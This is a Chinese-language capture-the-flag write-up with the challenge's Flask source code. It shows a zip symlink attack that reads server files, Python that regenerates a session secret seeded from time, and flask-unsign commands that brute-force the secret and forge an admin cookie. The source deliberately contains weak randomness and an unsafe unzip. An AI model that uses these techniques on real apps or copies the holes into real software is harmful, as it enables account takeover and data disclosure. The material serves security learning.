- # 题解
	- 题目源码解析:`app.py`
		- `/login`登陆接口
		- `/register`注册接口
		- `/upload`接收用户发送的zip文件，解压，并将解压后的路径告诉用户
		- `/uploads/<path>`读取zip解压后的文件并发给用户
		- `/flag`如果用户是admin即发送flag
		- 后端使用flask，其特点是将session签名保存在用户的cookie中，攻击者只需要想办法获取secret就可以伪造session
		- 将日志保存在`/tmp/server.log`中，可以通过日志判断启动时间
	- 源码解析:`config.py`
		- 会使用随机数生成secret用于签名session
		- 随机数种子用启动的时间以及`SECRET_OFFSET`的值生成
		- 播种公式：`random.seed(round((time.time() + SECRET_OFFSET) * 1000))`
			- `time.time()`时间戳，精确到毫秒
			- 种子：四舍五入的`(time.time() + SECRET_OFFSET) * 1000`
	- 任意文件读取：软链接攻击
	  id:: 63c3b277-fdc4-479f-974a-abc0cf1a9fc4
		- 在zip包内保存一个软链接，然后再让服务器读取这个软链接即可读取任意文件
		- 可以使用 [[CTF/Zip]] 读取任意文件
			- `ln -s /app/config.py file && zip -ry zip.zip file && base64 -w 0 zip.zip`
		- 无权读取flag文件
	- 主要思路：
		- 用任意文件读取漏洞读取`SECRET_OFFSET`和服务器启动时间
		  id:: 63c3b477-fe5e-4a86-8157-a27026da0934
		- 生成所有可能的secret
		  id:: 63c3b77c-b5b5-4079-a40f-2c005088f6f9
			- 因为服务器启动时间不够精确，只能这样
		- 用 [[CTF/Flask-Unsign]] 测试所有的secret, 发现只有一个可以解密签名
		  id:: 63c3b79c-6531-4b4c-833a-d2c4a0691519
		- 使用正确的secret伪造管理员身份拿到flag
		  id:: 63c3b85f-9bc5-4586-8bf1-318f562379d7
		- [[draws/2023-01-15-16-17-22.excalidraw]]
	- ((63c3b477-fe5e-4a86-8157-a27026da0934))
		- 使用 ((63c3b277-fdc4-479f-974a-abc0cf1a9fc4)) 读取`/app/config.py`和`/tmp/server.log`即可
	- ((63c3b77c-b5b5-4079-a40f-2c005088f6f9))
		- 代码：
			- ```python
			  from datetime import datetime
			  import random
			  
			  def timestamp_to_secret(timestamp):
			      random.seed(round((timestamp) * 1000))
			      return "".join([hex(random.randint(0, 15)) for x in range(32)]).replace("0x", "")
			  
			  SECRET_OFFSET = -67198624
			  
			  date_string = "2023-01-14 23:03:32 +0000"
			  dt_format = datetime.strptime(date_string, '%Y-%m-%d %H:%M:%S %z')
			  
			  timestamp = dt_format.timestamp()
			  timestamp += SECRET_OFFSET
			  
			  l = []
			  
			  for i in range(-2000, 2000):
			      l.append(timestamp_to_secret(timestamp + i / 1000))
			  
			  with open("test.txt", "w") as f:
			      f.writelines([line + "\n" for line in l])
			  ```
	- ((63c3b79c-6531-4b4c-833a-d2c4a0691519))
		- 运行`flask-unsign -u -w test.txt -c eyJhZG1pbiI6ZmFsc2UsInVpZCI6InRlc3R0ZXN0In0.Y8OwiQ.rKYwk2_A8u4XQqEyTJbVL5WcV64`
	- ((63c3b85f-9bc5-4586-8bf1-318f562379d7))
		- `flask-unsign -s --secret e897071bf3d5dc6ff7882fc0b64ece5c --cookie "{'admin': True, 'uid': 'testtest'}"`
- # 源码
	- `app.py`
		- ```python
		  import logging
		  import os
		  import re
		  import sqlite3
		  import subprocess
		  import uuid
		  import zipfile
		  
		  from flask import (Flask, flash, redirect, render_template, request, abort,
		                     send_from_directory, session)
		  from werkzeug.security import check_password_hash, generate_password_hash
		  
		  
		  app = Flask(__name__)
		  DATA_DIR = "/tmp/"
		  
		  # 设置最大文件大小
		  app.config['MAX_CONTENT_LENGTH'] = 2 * 1000 * 1000
		  
		  # 配置日志模块，将所有日志存储在/tmp/server.log中
		  LOG_HANDLER = logging.FileHandler(DATA_DIR + 'server.log')
		  LOG_HANDLER.setFormatter(logging.Formatter(fmt="[{levelname}] [{asctime}] {message}", style='{'))
		  logger = logging.getLogger("application")
		  logger.addHandler(LOG_HANDLER)
		  logger.propagate = False
		  for handler in logging.root.handlers[:]:
		      logging.root.removeHandler(handler)
		  logging.basicConfig(level=logging.WARNING, format='%(asctime)s %(levelname)s %(name)s %(threadName)s : %(message)s')
		  logging.getLogger().addHandler(logging.StreamHandler())
		  
		  # 设置秘密
		  app.config["SECRET_KEY"] = os.environ["SECRET_KEY"]
		  
		  @app.route("/")
		  def index():
		      return render_template("index.html")
		  
		  
		  @app.route("/login", methods=["GET", "POST"])
		  def login():
		      session.clear()
		  
		      if request.method == "GET":
		          return render_template("login.html")
		  
		      # 获取用户名和密码
		      username = request.form.get("username", "")
		      password = request.form.get("password", "")
		  
		      # 根据用户名查询密码，并和输入的密码对比
		      with sqlite3.connect(DATA_DIR + "database.db") as db:
		          res = db.cursor().execute("SELECT password, admin FROM users WHERE username=?", (username,))
		          user = res.fetchone()
		          if not user or not check_password_hash(user[0], password):
		              flash("Incorrect username/password", "danger")
		              return render_template("login.html")
		      
		      # 设置uid和admin
		      session["uid"] = username
		      session["admin"] = user[1]
		      return redirect("/upload")
		  
		  
		  @app.route("/register", methods=["GET", "POST"])
		  def register():
		      session.clear()
		  
		      if request.method == "GET":
		          return render_template("register.html")
		  
		      # 获取用户名和密码，用户名需要符合[a-zA-Z0-9_]{1,24}
		      username = request.form.get("username", "")
		      password = request.form.get("password", "")
		      if not username or not password or not re.fullmatch("[a-zA-Z0-9_]{1,24}", username):
		          flash("Invalid username/password", "danger")
		          return render_template("register.html")
		      
		      # 查询用户名是否重复，添加用户
		      with sqlite3.connect(DATA_DIR + "database.db") as db:
		          res = db.cursor().execute("SELECT username FROM users WHERE username=?", (username,))
		          if res.fetchone():
		              flash("That username is already registered", "danger")
		              return render_template("register.html")
		          
		          db.cursor().execute("INSERT INTO users (username, password) VALUES (?, ?)", (username, generate_password_hash(password)))
		          db.commit()
		      
		      session["uid"] = username
		      session["admin"] = False
		      return redirect("/upload")
		  
		  
		  @app.route("/upload", methods=["GET", "POST"])
		  def upload():
		      if not session.get("uid"):
		          return redirect("/login")
		      if request.method == "GET":
		          return render_template("upload.html")
		  
		      if "file" not in request.files:
		          flash("You didn't upload a file!", "danger")
		          return render_template("upload.html")
		      
		  
		      file = request.files["file"]
		  
		      # 生成随机名字并保存
		      uuidpath = str(uuid.uuid4())
		      filename = f"{DATA_DIR}uploadraw/{uuidpath}.zip"
		      file.save(filename)
		  
		      # 解压缩
		      subprocess.call(["unzip", filename, "-d", f"{DATA_DIR}uploads/{uuidpath}"])
		  
		      # 通知
		      flash(f'Your unique ID is <a href="/uploads/{uuidpath}">{uuidpath}</a>!', "success")
		      logger.info(f"User {session.get('uid')} uploaded file {uuidpath}")
		      return redirect("/upload")
		  
		  
		  @app.route("/uploads/<path:path>")
		  def uploads(path):
		      try:
		          return send_from_directory(DATA_DIR + "uploads", path)
		      except PermissionError:
		          abort(404)
		  
		  
		  @app.route("/flag")
		  def flag():
		      if not session.get("admin"):
		          return "Unauthorized!"
		      return subprocess.run("./flag", shell=True, stdout=subprocess.PIPE).stdout.decode("utf-8")
		  ```
	- `config.py`
		- ```python
		  import random
		  import os
		  import time
		  
		  SECRET_OFFSET = 0 # REDACTED
		  random.seed(round((time.time() + SECRET_OFFSET) * 1000))
		  os.environ["SECRET_KEY"] = "".join([hex(random.randint(0, 15)) for x in range(32)]).replace("0x", "")
		  ```